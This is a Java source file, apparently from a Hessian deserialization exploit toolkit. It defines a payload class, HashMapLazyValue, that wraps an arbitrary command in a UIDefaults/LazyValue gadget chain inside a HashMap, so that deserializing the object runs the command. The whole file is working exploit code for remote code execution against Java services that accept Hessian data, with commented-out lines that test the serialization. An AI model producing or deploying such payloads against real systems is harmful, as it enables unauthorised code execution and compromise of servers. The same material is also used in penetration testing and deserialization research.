package cn.butler.hessian.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.hessian.util.JDKUtil;

import javax.swing.*;
import java.util.HashMap;

import static cn.butler.hessian.util.Gadgets.makeLazyValueRceGadgets;

public class HashMapLazyValue implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        Object lazyValue = makeLazyValueRceGadgets(command);

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", lazyValue);
        u2.put("aaa", lazyValue);
        HashMap<Object, Object> equalsHashMap = JDKUtil.makeMap(u1, u2);

//        byte[] bytes = Serializer.serializeExcept(equalsHashMap);
//        System.out.println(Arrays.toString(bytes));
//        Serializer.deserialize(bytes);
//        Serializer.deserializeLite(bytes);
        return equalsHashMap;
    }
}
